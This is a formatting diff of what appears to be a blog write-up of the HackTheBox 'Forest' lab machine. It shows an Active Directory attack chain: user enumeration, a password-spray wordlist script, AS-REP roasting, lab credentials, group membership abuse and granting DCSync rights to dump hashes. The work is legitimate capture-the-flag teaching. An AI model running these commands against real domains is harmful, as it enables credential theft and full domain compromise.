@@ -137,12 +137,12 @@ Host script results:
 
 <p>We find a collection of ports that give us a high probability that this is windows machine and a domain controller:</p>
 <ul>
-  <li>DNS on port 53</li>
-  <li>Kerberos on port 88</li>
-  <li>SMB on port 445</li>
-  <li>LDAP on port 636</li>
-  <li>Global Catalog on port 3268</li>
-  <li>WinRM on port 5985</li>
+  <li><strong>DNS</strong> on port 53</li>
+  <li><strong>Kerberos</strong> on port 88</li>
+  <li><strong>SMB</strong> on port 445</li>
+  <li><strong>LDAP</strong> on port 636</li>
+  <li><strong>Global</strong> Catalog on port 3268</li>
+  <li><strong>WinRM</strong> on port 5985</li>
 </ul>
 
 <p>From the nmap script <code class="language-plaintext highlighter-rouge">smb-os-discovery</code>, the domain name should be <code class="language-plaintext highlighter-rouge">htb.local</code></p>
@@ -151,7 +151,9 @@ Host script results:
 
 <p>We want to start enumerating users. So we use an impacket tool called <code class="language-plaintext highlighter-rouge">GetADUsers.py</code>.</p>
 
-<p>The command is: <code class="language-plaintext highlighter-rouge">GetADUsers.py -dc-ip 10.10.10.161 "htb.local/" -all</code></p>
+<p>The command is:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetADUsers.py <span class="nt">-dc-ip</span> 10.10.10.161 <span class="s2">"htb.local/"</span> <span class="nt">-all</span>
+</code></pre></div></div>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
@@ -219,25 +221,25 @@ Also, the year this machine has been launched is 2019. So we will use that year 
 
 <p>I write a quick <code class="language-plaintext highlighter-rouge">PowerShell</code> script for this:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$CompanyName = "Forest"
-$Seasons = 'Summer', 'Winter', 'Spring', 'Fall'
-$Years = 2017..2021
-$Special_Chars = '!@#$%^&amp;*'.ToCharArray()
-$Wordlist = @()
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$CompanyName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"Forest"</span><span class="w">
+</span><span class="nv">$Seasons</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Summer'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Winter'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Spring'</span><span class="p">,</span><span class="w"> </span><span class="s1">'Fall'</span><span class="w">
+</span><span class="nv">$Years</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2017</span><span class="o">..</span><span class="mi">2021</span><span class="w">
+</span><span class="nv">$Special_Chars</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'!@#$%^&amp;*'</span><span class="o">.</span><span class="nf">ToCharArray</span><span class="p">()</span><span class="w">
+</span><span class="nv">$Wordlist</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@()</span><span class="w">
 
-Foreach($Year in $Years){
-	$Wordlist += "$CompanyName$Year"
-	$Wordlist += "$CompanyName$Year!"
-	Foreach($Season in $Seasons){
-		$Wordlist += "$Season$Year"
-		$Wordlist += "$Season$Year!"
-		Foreach($Char in $Special_Chars){
-			$Wordlist += "$Season$Char$Year"
-			$Wordlist += "$CompanyName$Char$Year"
-		}
-	}
-}
-</code></pre></div></div>
+</span><span class="kr">Foreach</span><span class="p">(</span><span class="nv">$Year</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$Years</span><span class="p">){</span><span class="w">
+	</span><span class="nv">$Wordlist</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$CompanyName$Year</span><span class="s2">"</span><span class="w">
+	</span><span class="nv">$Wordlist</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$CompanyName$Year</span><span class="s2">!"</span><span class="w">
+	</span><span class="kr">Foreach</span><span class="p">(</span><span class="nv">$Season</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$Seasons</span><span class="p">){</span><span class="w">
+		</span><span class="nv">$Wordlist</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$Season$Year</span><span class="s2">"</span><span class="w">
+		</span><span class="nv">$Wordlist</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$Season$Year</span><span class="s2">!"</span><span class="w">
+		</span><span class="kr">Foreach</span><span class="p">(</span><span class="nv">$Char</span><span class="w"> </span><span class="kr">in</span><span class="w"> </span><span class="nv">$Special_Chars</span><span class="p">){</span><span class="w">
+			</span><span class="nv">$Wordlist</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$Season$Char$Year</span><span class="s2">"</span><span class="w">
+			</span><span class="nv">$Wordlist</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s2">"</span><span class="nv">$CompanyName$Char$Year</span><span class="s2">"</span><span class="w">
+		</span><span class="p">}</span><span class="w">
+	</span><span class="p">}</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
 
 <p><em>Running that script,</em> I get a list of 370 passwords to try. Not bad :D</p>
 
@@ -266,8 +268,9 @@ Summer%2019
 
 <p>We see that <code class="language-plaintext highlighter-rouge">Account Lockout Threshold: None</code> and <code class="language-plaintext highlighter-rouge">Domain Password Lockout Admins: 0</code>. This is amazing! we can definitely bruteforce without any problems :D</p>
 
-<p>We start the spray using:
-<code class="language-plaintext highlighter-rouge">crackmapexec smb 10.10.10.161 -u users.txt -p passwords.txt --continue-on-success</code></p>
+<p>We start the spray using:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec smb 10.10.10.161 <span class="nt">-u</span> users.txt <span class="nt">-p</span> passwords.txt <span class="nt">--continue-on-success</span>
+</code></pre></div></div>
 
 <p>But we get no luck with that :/</p>
 
@@ -277,7 +280,8 @@ Summer%2019
 
 <p>we run this attack using impacket’s <code class="language-plaintext highlighter-rouge">GetNPUsers.py</code> script:</p>
 
-<p><code class="language-plaintext highlighter-rouge">GetNPUsers.py htb.local/ -usersfile users.txt -format hashcat -outputfile asrep-hashes.txt</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GetNPUsers.py htb.local/ <span class="nt">-usersfile</span> users.txt <span class="nt">-format</span> hashcat <span class="nt">-outputfile</span> asrep-hashes.txt
+</code></pre></div></div>
 
 <p>This is after we set <code class="language-plaintext highlighter-rouge">10.10.10.161</code> as our name server in <code class="language-plaintext highlighter-rouge">/etc/resolv.conf</code>. We do this because impacket does DNS lookups in the background.</p>
 
@@ -297,8 +301,8 @@ Summer%2019
 
 <p>Alright, here is our first set of creds:</p>
 <ul>
-  <li>Username: htb.local\svc-alfresco</li>
-  <li>Password: s3rvice</li>
+  <li><strong>Username:</strong> htb.local\svc-alfresco</li>
+  <li><strong>Password:</strong> s3rvice</li>
 </ul>
 
 <h3 id="remote-code-execution">Remote Code Execution</h3>
@@ -371,7 +375,9 @@ Summer%2019
 
 <p><img src="/assets/Forest/abuse-write-dacl.jpg" alt="abuse-write-dacl" /></p>
 
-<p>we add our user to that group using a powershell command: <code class="language-plaintext highlighter-rouge">Add-ADGroupMember 'Exchange Windows Permissions' -members 'svc-alfresco'</code></p>
+<p>we add our user to that group using a powershell command:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-ADGroupMember</span><span class="w"> </span><span class="s1">'Exchange Windows Permissions'</span><span class="w"> </span><span class="nt">-members</span><span class="w"> </span><span class="s1">'svc-alfresco'</span><span class="w">
+</span></code></pre></div></div>
 
 <p><img src="/assets/Forest/adding-to-group.jpg" alt="adding-to-group" /></p>
 
@@ -385,10 +391,10 @@ Summer%2019
 
 <p>we notice that we need to create a Powershell <code class="language-plaintext highlighter-rouge">Credential Object</code> and run the command to give our user <code class="language-plaintext highlighter-rouge">svc-alfresco</code> <code class="language-plaintext highlighter-rouge">DCSync</code> rights over <code class="language-plaintext highlighter-rouge">htb.local</code>. It should be as below:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$SecPassword = ConvertTo-SecureString 's3rvice'-AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('HTB.local\svc-alfresco', $SecPassword)
-Add-DomainObjectAcl -TargetIdentity "dc=htb,dc=local" -PrincipalIdentity 'HTB.local\svc-alfresco' -Rights DCSync -Credential $Cred -Verbose
-</code></pre></div></div>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$SecPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'s3rvice'</span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="nv">$Cred</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Management.Automation.PSCredential</span><span class="p">(</span><span class="s1">'HTB.local\svc-alfresco'</span><span class="p">,</span><span class="w"> </span><span class="nv">$SecPassword</span><span class="p">)</span><span class="w">
+</span><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s2">"dc=htb,dc=local"</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="s1">'HTB.local\svc-alfresco'</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">DCSync</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
 
 <p>This takes a little while to run but we eventually have permission to dump hashes.</p>
 
